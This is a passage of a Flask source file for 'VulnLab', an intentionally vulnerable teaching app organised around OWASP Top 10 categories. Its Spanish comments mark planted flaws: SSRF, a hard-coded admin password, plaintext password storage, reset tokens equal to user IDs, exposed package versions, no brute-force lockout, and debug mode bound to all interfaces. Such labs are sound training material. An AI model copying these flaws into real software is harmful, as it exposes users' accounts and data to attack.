security_logger.addHandler(_handler)

ADMIN_TEMPLATE = _H + """
<div class="pt">Panel Admin</div>
<div class="ps">A09 · Security Logging and Monitoring Failures</div>
<div class="card">
  <form method="GET">
    <div class="field"><label>Contraseña</label><input type="password" name="password" value="{{ pwd }}"></div>
    <button type="submit">Acceder</button>
  </form>
</div>
{% if users %}
<div class="card" style="margin-top:0">
  <div style="font-size:10px;color:var(--mu);margin-bottom:12px;text-transform:uppercase;letter-spacing:.08em">Usuarios del sistema</div>
  <table>
    <tr><th>Rol</th><th>Usuario</th><th>Email</th></tr>
    {% for u in users %}<tr><td>{{ u }}</td></tr>{% endfor %}
  </table>
</div>
{% elif error %}
<div class="alert aerr">{{ error }}</div>
{% endif %}
""" + _F

@app.route("/admin")
def admin():
    # VULNERABLE: sin logging → los intentos de fuerza bruta son invisibles
    password = request.args.get("password", "")
    users = None
    error = None
    if password == "admin123":
        conn = sqlite3.connect(DB_PATH)
        rows = conn.execute("SELECT id, username, email, role FROM users").fetchall()
        conn.close()
        users = [f"[{r[3]}] {r[1]} <{r[2]}>" for r in rows]
    elif password:
        error = "Acceso denegado"
    return render_template_string(ADMIN_TEMPLATE, users=users, error=error, pwd=password, hint=HINTS["admin"])


@app.route("/admin-safe")
def admin_safe():
    """Versión del mismo endpoint CON logging — para comparar en clase."""
    ip = request.remote_addr
    password = request.args.get("password", "")
    users = None
    error = None
    if password == "admin123":
        security_logger.info(f"ADMIN_LOGIN_OK ip={ip}")
        conn = sqlite3.connect(DB_PATH)
        rows = conn.execute("SELECT id, username, email, role FROM users").fetchall()
        conn.close()
        users = [f"[{r[3]}] {r[1]} <{r[2]}>" for r in rows]
    elif password:
        security_logger.warning(f"ADMIN_LOGIN_FAIL ip={ip} pwd_len={len(password)}")
        error = "Acceso denegado (intento registrado en /tmp/security.log)"
    return render_template_string(ADMIN_TEMPLATE, users=users, error=error, pwd=password, hint=HINTS["admin"])


@app.route("/api/logs")
def api_logs():
    """Devuelve las últimas líneas del log de seguridad (para el dashboard)."""
    try:
        with open("/tmp/security.log") as f:
            lines = f.readlines()[-20:]
        return jsonify({"lines": lines})
    except FileNotFoundError:
        return jsonify({"lines": ["(sin entradas aún — usa /admin-safe para generar logs)"]})


# ─── VULNERABILIDAD 9: SSRF — Server-Side Request Forgery (A10) ───────────────

FETCH_TEMPLATE = _H + """
<div class="pt">Visor de URLs</div>
<div class="ps">A10 · Server-Side Request Forgery (SSRF)</div>
<div class="card">
  <form method="GET">
    <div class="field"><label>URL a obtener</label><input type="url" name="url" value="{{ url }}" placeholder="http://..." autocomplete="off"></div>
    <button type="submit">Obtener</button>
  </form>
</div>
{% if content %}
<div class="card" style="margin-top:0">
  <div style="font-size:10px;color:var(--mu);margin-bottom:8px;text-transform:uppercase;letter-spacing:.08em">Respuesta de {{ url }}</div>
  <pre>{{ content }}</pre>
</div>
{% elif error %}
<div class="alert aerr">Error: {{ error }}</div>
{% endif %}
""" + _F

@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    content = ""
    error = ""
    if url:
        try:
            # VULNERABLE: fetcha cualquier URL sin validación de host ni esquema
            req = urllib.request.Request(url, headers={"User-Agent": "VulnLab/1.0"})
            with urllib.request.urlopen(req, timeout=4) as resp:
                raw = resp.read(4096)
                content = raw.decode(errors="replace")
        except Exception as e:
            error = str(e)
    return render_template_string(FETCH_TEMPLATE, url=url, content=content, error=error, hint=HINTS["fetch"])


# ─── VULNERABILIDAD A02: Cryptographic Failures ───────────────────────────────

@app.route("/crypto")
def crypto():
    conn = sqlite3.connect(DB_PATH)
    # VULNERABLE: contraseñas en texto plano, sin hashing
    rows = conn.execute("SELECT id, username, password, role FROM users").fetchall()
    conn.close()
    session_cookie = request.cookies.get("session", "")
    return render_template_string(_H + """
<div class="pt">Cryptographic Failures</div>
<div class="ps">A02 · Cryptographic Failures — Contraseñas en texto plano</div>
<div class="card">
  <div style="font-size:10px;color:var(--mu);margin-bottom:12px;text-transform:uppercase;letter-spacing:.08em">
    Usuarios en la base de datos (contraseñas sin hashear)
  </div>
  <table>
    <tr><th>#</th><th>Usuario</th><th>Contraseña</th><th>Rol</th></tr>
    {% for r in users %}
    <tr>
      <td>{{ r[0] }}</td>
      <td>{{ r[1] }}</td>
      <td style="color:var(--err);font-weight:600">{{ r[2] }}</td>
      <td><span class="badge {% if r[3]=='admin' %}bc{% else %}bi{% endif %}">{{ r[3] }}</span></td>
    </tr>
    {% endfor %}
  </table>
</div>
{% if session_cookie %}
<div class="card" style="margin-top:0">
  <div style="font-size:10px;color:var(--mu);margin-bottom:8px;text-transform:uppercase;letter-spacing:.08em">Cookie de sesión actual (firmada, no cifrada)</div>
  <pre>{{ session_cookie }}</pre>
  <p style="font-size:11px;color:var(--mu)">La secret_key está expuesta en <a href="/info">/info</a>. Con ella se puede falsificar esta cookie.</p>
</div>
{% endif %}
""" + _F, users=rows, session_cookie=session_cookie, hint=HINTS["crypto"])


# ─── VULNERABILIDAD A04: Insecure Design — Token predecible ───────────────────

@app.route("/reset", methods=["GET", "POST"])
def reset():
    msg = ""
    token_shown = ""
    success = False
    if request.method == "POST":
        action = request.form.get("action", "request")
        if action == "request":
            username = request.form.get("username", "")
            conn = sqlite3.connect(DB_PATH)
            row = conn.execute("SELECT id FROM users WHERE username=?", (username,)).fetchone()
            conn.close()
            if row:
                # VULNERABLE: token = user ID (predecible, sin entropía)
                token = str(row[0])
                _reset_tokens[token] = row[0]
                token_shown = token
                msg = "Token generado y 'enviado por email'"
            else:
                msg = "Usuario no encontrado"
        elif action == "use":
            token = request.form.get("token", "")
            new_pass = request.form.get("new_password", "")
            if token in _reset_tokens:
                user_id = _reset_tokens.pop(token)
                conn = sqlite3.connect(DB_PATH)
                conn.execute("UPDATE users SET password=? WHERE id=?", (new_pass, user_id))
                conn.commit()
                conn.close()
                success = True
                msg = f"Contraseña actualizada para usuario #{user_id}"
            else:
                msg = "Token inválido o expirado"
    return render_template_string(_H + """
<div class="pt">Reset de contraseña</div>
<div class="ps">A04 · Insecure Design — Token de reset predecible</div>
{% if msg %}
<div class="alert {% if success %}aok{% else %}awk{% endif %}">
  {{ msg }}
  {% if token_shown %}<br>Token generado: <strong style="color:var(--err);font-size:15px">{{ token_shown }}</strong> <span style="color:var(--mu);font-size:11px">(= ID del usuario)</span>{% endif %}
</div>
{% endif %}
<div class="card">
  <div style="font-size:10px;color:var(--mu);margin-bottom:16px;text-transform:uppercase;letter-spacing:.08em">Paso 1 — Solicitar token</div>
  <form method="POST">
    <input type="hidden" name="action" value="request">
    <div class="field"><label>Usuario</label><input type="text" name="username" placeholder="admin, alice, bob" autocomplete="off"></div>
    <button type="submit">Solicitar reset</button>
  </form>
</div>
<div class="card" style="margin-top:0">
  <div style="font-size:10px;color:var(--mu);margin-bottom:16px;text-transform:uppercase;letter-spacing:.08em">Paso 2 — Usar token</div>
  <form method="POST">
    <input type="hidden" name="action" value="use">
    <div class="field"><label>Token recibido</label><input type="text" name="token" placeholder="Prueba: 1, 2 o 3" autocomplete="off"></div>
    <div class="field"><label>Nueva contraseña</label><input type="password" name="new_password"></div>
    <button type="submit">Cambiar contraseña</button>
  </form>
</div>
""" + _F, msg=msg, token_shown=token_shown, success=success, hint=HINTS["reset"])


# ─── VULNERABILIDAD A06: Vulnerable and Outdated Components ───────────────────

@app.route("/components")
def components():
    # VULNERABLE: expone todas las versiones de paquetes instalados
    try:
        result = subprocess.run(
            ["pip", "list", "--format=columns"],
            capture_output=True, text=True, timeout=10
        )
        packages_raw = result.stdout
    except Exception as e:
        packages_raw = f"Error: {e}"

    # Parsear líneas en (nombre, versión)
    lines = packages_raw.strip().splitlines()
    headers = lines[:1]
    packages = []
    for line in lines[2:]:
        parts = line.split()
        if len(parts) >= 2:
            packages.append((parts[0], parts[1]))

    return render_template_string(_H + """
<div class="pt">Dependencias instaladas</div>
<div class="ps">A06 · Vulnerable and Outdated Components — Versiones expuestas</div>
<div class="card">
  <div style="font-size:10px;color:var(--mu);margin-bottom:12px;text-transform:uppercase;letter-spacing:.08em">
    Paquetes Python instalados ({{ packages|length }} total)
  </div>
  <table>
    <tr><th>Paquete</th><th>Versión instalada</th></tr>
    {% for name, ver in packages %}
    <tr><td>{{ name }}</td><td><code>{{ ver }}</code></td></tr>
    {% endfor %}
  </table>
</div>
<p style="font-size:11px;color:var(--mu)">
  Exponer este listado permite a un atacante identificar CVEs conocidos para cada versión exacta.
  Audita con <code>pip-audit</code> o <code>safety check</code>.
</p>
""" + _F, packages=packages, hint=HINTS["components"])


# ─── VULNERABILIDAD A07: Identification and Authentication Failures ────────────

@app.route("/auth", methods=["GET", "POST"])
def auth():
    msg = ""
    success = False
    attempts = _bf_counter.get("auth_" + (request.remote_addr or ""), 0)
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        # Usa query parametrizada (sin SQLi) para enfocar la vuln en A07
        # VULNERABLE: sin lockout, sin rate limiting, sin CAPTCHA
        conn = sqlite3.connect(DB_PATH)
        row = conn.execute(
            "SELECT id, username, role FROM users WHERE username=? AND password=?",
            (username, password)
        ).fetchone()
        conn.close()
        attempts = _bf_counter.get("auth_" + (request.remote_addr or ""), 0)
        if row:
            session["user_id"] = row[0]
            session["role"] = row[2]
            success = True
            msg = f"Acceso concedido: {row[1]} [{row[2]}] — intento #{attempts}"
        else:
            msg = f"Credenciales incorrectas — intento #{attempts} (sin bloqueo activo)"
    return render_template_string(_H + """
<div class="pt">Autenticación</div>
<div class="ps">A07 · Identification and Authentication Failures — Sin bloqueo de cuenta</div>
{% if msg %}
<div class="alert {% if success %}aok{% else %}aerr{% endif %}">{{ msg }}</div>
{% endif %}
<div class="card">
  <form method="POST">
    <div class="field"><label>Usuario</label><input type="text" name="username" autocomplete="off"></div>
    <div class="field"><label>Contraseña</label><input type="password" name="password"></div>
    <button type="submit">Iniciar sesión</button>
  </form>
</div>
<div class="card" style="margin-top:0">
  <div style="font-size:10px;color:var(--mu);margin-bottom:8px;text-transform:uppercase;letter-spacing:.08em">Contador de intentos desde tu IP</div>
  <div style="font-size:28px;font-weight:700;color:{% if attempts >= 5 %}var(--err){% else %}var(--tx){% endif %}">{{ attempts }}</div>
  <p style="font-size:11px;color:var(--mu);margin-top:4px">No hay lockout, no hay CAPTCHA, no hay delay — puedes intentar indefinidamente.</p>
</div>
""" + _F, msg=msg, success=success, attempts=attempts, hint=HINTS["auth"])


@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")


@app.route("/api/health")
def health():
    return jsonify({"status": "ok", "app": "VulnLab", "version": "1.0"})


if __name__ == "__main__":
    init_db()
    print("[*] VulnLab corriendo en http://127.0.0.1:5000")
    print("[*] Dashboard:           http://127.0.0.1:5000/dashboard")
    print("[!] Solo para uso educativo en entornos controlados")
    app.run(host="0.0.0.0", port=5000, debug=True)
